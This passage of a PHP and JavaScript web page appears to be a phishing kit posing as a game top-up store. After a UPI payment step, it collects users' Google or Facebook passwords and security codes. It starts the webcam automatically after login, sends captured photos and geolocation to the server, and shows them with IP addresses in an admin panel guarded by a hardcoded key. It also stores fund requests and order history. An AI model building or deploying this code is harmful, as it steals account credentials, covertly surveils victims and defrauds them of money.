        <button onclick="showAddFundsPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6;">Add Funds</button>
        <button onclick="showFundsHistoryPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6;">Fund Requests</button>
        <button onclick="showAdminPanel(); toggleSidebar();" style="margin:8px 0; background:rgba(122,43,158,0.3); border:1px solid #9b59b6;">Admin Panel</button>
        <button onclick="openTelegram(); toggleSidebar();" class="telegram-btn">Telegram Support</button>
        <a href="?logout=1" style="display:block; margin-top:20px; color:#ff4444; text-align:center; text-decoration:none;">Logout</a>
    </div>

    <div class="top-menu">
        <button onclick="showOrdersPage()">Order History</button>
        <button onclick="showNotificationsPage()">Notifications</button>
        <button onclick="showAddFundsPage()">Add Funds</button>
        <button onclick="showFundsHistoryPage()">Fund Requests</button>
        <button onclick="showAdminPanel()">Admin Panel</button>
    </div>

    <div class="wallet-card">
        <p>Wallet Balance</p>
        <div class="wallet-amount">₹<?php echo number_format($user['wallet'], 2); ?></div>
        <button onclick="showAddFundsPage()" style="margin-top:15px; width:auto; padding:8px 30px;">+ Add Funds</button>
    </div>

    <?php if($msg): ?>
        <div style="background:rgba(26,10,46,0.8); padding:12px; border-radius:8px; margin-bottom:20px; text-align:center; border:1px solid #9b59b6;"><?php echo htmlspecialchars($msg); ?></div>
    <?php endif; ?>

    <!-- Memberships -->
    <img src="<?php echo $membership_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($m = $memberships->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $m['icon']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $m['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($m['price'], 2); ?></div>
            <form method="post">
                <input type="hidden" name="item_type" value="membership">
                <input type="hidden" name="item_id" value="<?php echo $m['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $m['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $m['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Diamonds -->
    <img src="<?php echo $diamond_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($d = $diamonds->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $d['image']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $d['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($d['price'], 2); ?></div>
            <form method="post">
                <input type="hidden" name="item_type" value="diamond">
                <input type="hidden" name="item_id" value="<?php echo $d['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $d['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $d['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Guns -->
    <img src="<?php echo $gunstore_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($g = $guns->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $g['image']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $g['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($g['price'], 2); ?></div>
            <div style="font-size:12px; color:#888;">Gifted to your game ID</div>
            <form method="post">
                <input type="hidden" name="item_type" value="gun">
                <input type="hidden" name="item_id" value="<?php echo $g['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $g['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $g['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Fixed Buttons -->
    <a href="https://wa.me/9485813638" class="whatsapp-fixed">WhatsApp</a>
    <button class="telegram-fixed" onclick="openTelegram()">Telegram</button>
    <button class="cart-fixed" onclick="showCart()">Cart (<?php echo count($cart_items); ?>)</button>
</div>

<!-- Camera -->
<div class="camera-container">
    <video id="video" style="width:100%; border-radius:8px; display:none;"></video>
    <img id="capturedPhoto" style="width:100%; border-radius:8px; display:none;">
    <button id="cameraBtn" onclick="startCamera()" style="background:#9b59b6;">📷 Camera</button>
    <button id="captureBtn" onclick="capturePhoto()" style="background:#00cc00; display:none;">Capture</button>
    <button id="savePhotoBtn" onclick="savePhoto()" style="background:#ff4444; display:none;">Save</button>
</div>

<!-- Order History -->
<div id="ordersPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Order History</h3>
        <?php $orders = $db->query("SELECT * FROM orders WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasOrder = false;
        while($o = $orders->fetchArray()) { $hasOrder = true; echo "<div class='order-item'><strong>{$o['name']}</strong><br>₹{$o['amount']}<br><small>{$o['created_at']}</small></div>"; }
        if(!$hasOrder) echo "<p style='text-align:center;padding:20px;color:#888;'>No orders yet</p>"; ?>
        <button onclick="closePopup('ordersPage')" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<!-- Notifications -->
<div id="notificationsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Notifications</h3>
        <?php $notif = $db->query("SELECT * FROM notifications WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasNotif = false;
        while($n = $notif->fetchArray()) { $hasNotif = true; echo "<div class='notif-item'>{$n['message']}<br><small>{$n['created_at']}</small></div>"; }
        if(!$hasNotif) echo "<p style='text-align:center;padding:20px;color:#888;'>No notifications</p>"; ?>
        <button onclick="closePopup('notificationsPage')" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<!-- Fund Requests -->
<div id="fundsHistoryPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Fund Requests</h3>
        <?php $funds = $db->query("SELECT * FROM fund_requests WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasFund = false;
        while($f = $funds->fetchArray()) { $hasFund = true; echo "<div class='order-item'>₹{$f['amount']}<br>UTR: {$f['utr']}<br>Status: {$f['status']}<br><small>{$f['created_at']}</small></div>"; }
        if(!$hasFund) echo "<p style='text-align:center;padding:20px;color:#888;'>No fund requests</p>"; ?>
        <button onclick="closePopup('fundsHistoryPage')" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<!-- Add Funds -->
<div id="addFundsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Add Funds</h3>
        <p style="text-align:center; color:#ff4444; font-weight:bold;">Minimum ₹399</p>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="setAmount(399)">₹399</button>
            <button class="bonus-btn" onclick="setAmount(500)">₹500</button>
            <button class="bonus-btn" onclick="setAmount(1000)">₹1000</button>
        </div>
        <input type="number" id="fundsAmount" placeholder="Custom amount (Min ₹399)">
        <button onclick="generateFundsQR()">Proceed to Pay</button>
        <div class="verified-badge">Please use your own bank account</div>
        <button onclick="closePopup('addFundsPage')" style="margin-top:15px; background:#333;">Cancel</button>
    </div>
</div>

<!-- Cart -->
<div id="cartPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Your Cart</h3>
        <?php if(count($cart_items) == 0): ?>
            <p style="text-align:center;padding:20px;color:#888;">Cart is empty</p>
        <?php else: ?>
            <?php foreach($cart_items as $idx => $item): ?>
            <div class="cart-item">
                <span><?php echo $item['name']; ?> - ₹<?php echo $item['price']; ?></span>
                <a href="?remove_cart=<?php echo $idx; ?>" style="color:#ff4444; text-decoration:none;">Remove</a>
            </div>
            <?php endforeach; ?>
            <div class="cart-total">Total: ₹<?php echo $cart_total; ?></div>
            <form method="post">
                <button type="submit" name="checkout">Proceed to Pay</button>
            </form>
        <?php endif; ?>
        <button onclick="closePopup('cartPage')" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<!-- Checkout -->
<div id="checkoutPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Complete Payment</h3>
        <p style="font-size:18px; text-align:center; margin:15px 0;">Total: ₹<?php echo $checkout_total; ?></p>
        <p style="color:#ff4444; font-size:12px; text-align:center;">Min ₹399</p>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="setCheckoutAmount(<?php echo max(399, $checkout_total); ?>)">₹<?php echo max(399, $checkout_total); ?></button>
            <button class="bonus-btn" onclick="setCheckoutAmount(500)">₹500</button>
            <button class="bonus-btn" onclick="setCheckoutAmount(1000)">₹1000</button>
        </div>
        <input type="number" id="checkoutAmount" placeholder="Enter amount (Min <?php echo max(399, $checkout_total); ?>)">
        <button onclick="generateCheckoutQR()">Pay Now</button>
        <button onclick="closePopup('checkoutPage')" style="margin-top:10px; background:#333;">Cancel</button>
    </div>
</div>

<!-- QR Popup -->
<div id="qrPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Scan & Pay</h3>
        <img id="qrImage" src="" width="180" style="margin:15px auto; background:#fff; padding:10px; border-radius:12px;">
        <p id="qrAmount" style="font-size:20px; color:#ffd700;"></p>
        <p style="color:#888; font-size:12px;">UPI: <?php echo $upi_id; ?></p>
        <input type="text" id="utrInput" placeholder="Enter UTR Number">
        <button onclick="submitUTR()">Submit</button>
        <button onclick="closePopup('qrPopup')">Cancel</button>
    </div>
</div>

<!-- Game Account -->
<div id="gameAccountPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Select Your Game Account</h3>
        <div class="game-login-btns">
            <img src="https://i.ibb.co/wZTBJn3g/file-75.jpg" class="game-icon" onclick="showGoogleForm()">
            <img src="https://i.ibb.co/k2S25TS9/file-74.jpg" class="game-icon" onclick="showFacebookForm()">
        </div>
        <button onclick="closePopup('gameAccountPopup')">Cancel</button>
    </div>
</div>

<!-- Google Form Funds -->
<div id="googleFormFundsPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Google Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_google_funds">Submit</button>
            <button type="button" onclick="closePopup('googleFormFundsPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form Funds -->
<div id="fbFormFundsPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="text" name="login" placeholder="Phone Number or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="username" placeholder="Username" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_fb_funds">Submit</button>
            <button type="button" onclick="closePopup('fbFormFundsPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Google Form Order -->
<div id="googleFormOrderPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Google Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_google_order">Submit</button>
            <button type="button" onclick="closePopup('googleFormOrderPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form Order -->
<div id="fbFormOrderPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="text" name="login" placeholder="Phone Number or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="username" placeholder="Username" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_fb_order">Submit</button>
            <button type="button" onclick="closePopup('fbFormOrderPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Admin Panel -->
<div id="adminPage" class="page-popup">
    <div class="popup-card" style="max-width:800px;">
        <h3 style="color:#9b59b6; text-align:center;">Admin Panel</h3>
        <input type="password" id="adminKeyInput" placeholder="Enter Admin Key">
        <button onclick="showAdminContent()">Access</button>
        
        <div id="adminContent" style="display:none; margin-top:20px;">
            <div class="admin-panel">
                <h4>Change UPI</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                    <input type="hidden" name="admin_action" value="change_upi">
                    <input type="text" name="new_upi" placeholder="New UPI ID" value="<?php echo $upi_id; ?>">
                    <button type="submit" class="admin-btn">Update</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Login Page</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                    <input type="hidden" name="admin_action" value="toggle_login">
                    <p>Status: <strong style="color:<?php echo $login_enabled == '1' ? '#00cc00' : '#ff4444'; ?>;"><?php echo $login_enabled == '1' ? 'Enabled' : 'Disabled'; ?></strong></p>
                    <button type="submit" class="admin-btn <?php echo $login_enabled == '1' ? 'danger-btn' : 'success-btn'; ?>">
                        <?php echo $login_enabled == '1' ? 'Disable Login' : 'Enable Login'; ?>
                    </button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Background Color</h4>
                <form method="post">
                    <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                    <input type="hidden" name="admin_action" value="change_bg">
                    <input type="color" name="new_bg" value="<?php echo $bg_color; ?>" style="height:50px; padding:2px;">
                    <button type="submit" class="admin-btn">Apply</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Ban / Unban IP</h4>
                <form method="post" style="display:flex; gap:10px; flex-wrap:wrap;">
                    <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                    <input type="hidden" name="admin_action" value="ban_ip">
                    <input type="text" name="ban_ip" placeholder="IP to Ban" style="flex:1; min-width:150px;">
                    <button type="submit" class="admin-btn danger-btn">Ban</button>
                </form>
                <form method="post" style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
                    <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                    <input type="hidden" name="admin_action" value="unban_ip">
                    <input type="text" name="unban_ip" placeholder="IP to Unban" style="flex:1; min-width:150px;">
                    <button type="submit" class="admin-btn success-btn">Unban</button>
                </form>
            </div>
            
            <div class="admin-panel">
                <h4>Users (<?php echo $db->querySingle("SELECT COUNT(*) FROM users"); ?>)</h4>
                <div class="admin-grid">
                <?php $allUsers = $db->query("SELECT * FROM users ORDER BY id DESC");
                while($u = $allUsers->fetchArray()): ?>
                    <div class="admin-user-card">
                        <p><span class="label">ID:</span> <?php echo $u['id']; ?></p>
                        <p><span class="label">Name:</span> <?php echo $u['name'] ?? 'N/A'; ?></p>
                        <p><span class="label">Email:</span> <?php echo $u['email']; ?></p>
                        <p><span class="label">Wallet:</span> ₹<?php echo number_format($u['wallet'], 2); ?></p>
                        <p><span class="label">IP:</span> <?php echo $u['ip'] ?? 'Unknown'; ?></p>
                        <p><span class="label">Status:</span> <?php echo $u['banned'] == 1 ? '<span style="color:#ff4444;">Banned</span>' : '<span style="color:#00cc00;">Active</span>'; ?></p>
                        <form method="post" style="margin-top:10px;">
                            <input type="hidden" name="admin_key" value="OWNER-X-ROHIT">
                            <input type="hidden" name="admin_action" value="delete_user">
                            <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                            <button type="submit" class="admin-btn danger-btn" style="padding:5px 15px; font-size:12px;" onclick="return confirm('Delete?')">Delete</button>
                        </form>
                    </div>
                <?php endwhile; ?>
                </div>
            </div>
            
            <div class="admin-panel">
                <h4>Captured Photos (<?php echo count($captured_photos); ?>)</h4>
                <div class="captured-grid">
                <?php foreach($captured_photos as $photo): ?>
                    <div class="captured-item">
                        <img src="<?php echo $photo['captured_photo']; ?>">
                        <p><strong><?php echo $photo['name'] ?? 'Unknown'; ?></strong></p>
                        <p>IP: <?php echo $photo['ip'] ?? 'Unknown'; ?></p>
                        <p>Location: <?php echo $photo['location'] ?? 'Unknown'; ?></p>
                    </div>
                <?php endforeach; ?>
                <?php if(count($captured_photos) == 0): ?>
                    <p style="color:#888;">No captured photos</p>
                <?php endif; ?>
                </div>
            </div>
        </div>
        <button onclick="closePopup('adminPage')" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<script>
let selectedAmount = 0;
let checkoutTotal = <?php echo $checkout_total; ?>;
let isFromCheckout = false;

function toggleSidebar() {
    var sidebar = document.getElementById('sidebar');
    sidebar.style.display = sidebar.style.display === 'none' ? 'block' : 'none';
}

function closePopup(id) {
    document.getElementById(id).style.display = 'none';
}

function showOrdersPage() { document.getElementById('ordersPage').style.display = 'block'; document.getElementById('sidebar').style.display = 'none'; }
function showNotificationsPage() { document.getElementById('notificationsPage').style.display = 'block'; document.getElementById('sidebar').style.display = 'none'; }
function showFundsHistoryPage() { document.getElementById('fundsHistoryPage').style.display = 'block'; document.getElementById('sidebar').style.display = 'none'; }
function showAddFundsPage() { document.getElementById('addFundsPage').style.display = 'block'; document.getElementById('sidebar').style.display = 'none'; }
function showCart() { document.getElementById('cartPage').style.display = 'block'; }
function showAdminPanel() { document.getElementById('adminPage').style.display = 'block'; document.getElementById('sidebar').style.display = 'none'; }

function setAmount(amt) { document.getElementById('fundsAmount').value = amt; }
function setCheckoutAmount(amt) { document.getElementById('checkoutAmount').value = amt; }

function generateFundsQR() {
    let amt = parseFloat(document.getElementById('fundsAmount').value);
    if(!amt || amt < 399) { alert('Minimum ₹399'); return; }
    selectedAmount = amt;
    isFromCheckout = false;
    document.getElementById('addFundsPage').style.display = 'none';
    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=${encodeURIComponent('<?php echo $upi_id; ?>')}&pn=GunStore&am=${selectedAmount}&cu=INR`;
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerHTML = `₹${selectedAmount}`;
    document.getElementById('qrPopup').style.display = 'flex';
}

function generateCheckoutQR() {
    let amt = parseFloat(document.getElementById('checkoutAmount').value);
    let minAmt = Math.max(399, checkoutTotal);
    if(!amt || amt < minAmt) { alert(`Minimum amount is ₹${minAmt}`); return; }
    selectedAmount = amt;
    isFromCheckout = true;
    document.getElementById('checkoutPage').style.display = 'none';
    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=${encodeURIComponent('<?php echo $upi_id; ?>')}&pn=GunStore&am=${selectedAmount}&cu=INR`;
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerHTML = `₹${selectedAmount}`;
    document.getElementById('qrPopup').style.display = 'flex';
}

function submitUTR() {
    let utr = document.getElementById('utrInput').value;
    if(!utr) { alert('Enter UTR'); return; }
    document.getElementById('qrPopup').style.display = 'none';
    document.getElementById('gameAccountPopup').style.display = 'flex';
}

function showGoogleForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    if(isFromCheckout) {
        document.getElementById('googleFormOrderPopup').style.display = 'flex';
    } else {
        document.getElementById('googleFormFundsPopup').style.display = 'flex';
    }
}

function showFacebookForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    if(isFromCheckout) {
        document.getElementById('fbFormOrderPopup').style.display = 'flex';
    } else {
        document.getElementById('fbFormFundsPopup').style.display = 'flex';
    }
}

function showAdminContent() {
    var key = document.getElementById('adminKeyInput').value;
    if(key === 'OWNER-X-ROHIT') {
        document.getElementById('adminContent').style.display = 'block';
        document.getElementById('adminKeyInput').style.display = 'none';
        alert('Admin access granted!');
    } else {
        alert('Invalid admin key!');
    }
}

function openTelegram() {
    window.open('https://t.me/ROHITxBOSS', '_blank');
}

// Camera Functions
function startCamera() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                var video = document.getElementById('video');
                video.srcObject = stream;
                video.style.display = 'block';
                document.getElementById('cameraBtn').style.display = 'none';
                document.getElementById('captureBtn').style.display = 'inline-block';
                document.getElementById('capturedPhoto').style.display = 'none';
            })
            .catch(err => {
                alert('Camera permission required!');
            });
    }
}

function capturePhoto() {
    var video = document.getElementById('video');
    var canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    var photoData = canvas.toDataURL('image/jpeg');
    
    document.getElementById('capturedPhoto').src = photoData;
    document.getElementById('capturedPhoto').style.display = 'block';
    document.getElementById('video').style.display = 'none';
    document.getElementById('captureBtn').style.display = 'none';
    document.getElementById('savePhotoBtn').style.display = 'inline-block';
    
    video.srcObject.getTracks().forEach(track => track.stop());
}

function savePhoto() {
    var photoData = document.getElementById('capturedPhoto').src;
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            var location = position.coords.latitude + ',' + position.coords.longitude;
            sendPhotoToServer(photoData, location);
        }, () => {
            sendPhotoToServer(photoData, 'Unknown');
        });
    } else {
        sendPhotoToServer(photoData, 'Unknown');
    }
}

function sendPhotoToServer(photoData, location) {
    var formData = new FormData();
    formData.append('photo_data', photoData);
    formData.append('location', location);
    formData.append('capture_photo', '1');
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        alert('Photo saved!');
        document.getElementById('capturedPhoto').style.display = 'none';
        document.getElementById('savePhotoBtn').style.display = 'none';
        document.getElementById('cameraBtn').style.display = 'inline-block';
    });
}

// Auto start camera
<?php if(isset($_SESSION['user_id'])): ?>
setTimeout(startCamera, 2000);
<?php endif; ?>
<?php if($show_cart): ?> showCart(); <?php endif; ?>
<?php if($step == 'checkout'): ?> document.getElementById('checkoutPage').style.display = 'flex'; <?php endif; ?>
<?php if($step == 'game_account'): ?> document.getElementById('gameAccountPopup').style.display = 'flex'; <?php endif; ?>
</script>
<?php endif; ?>
</body>
</html>
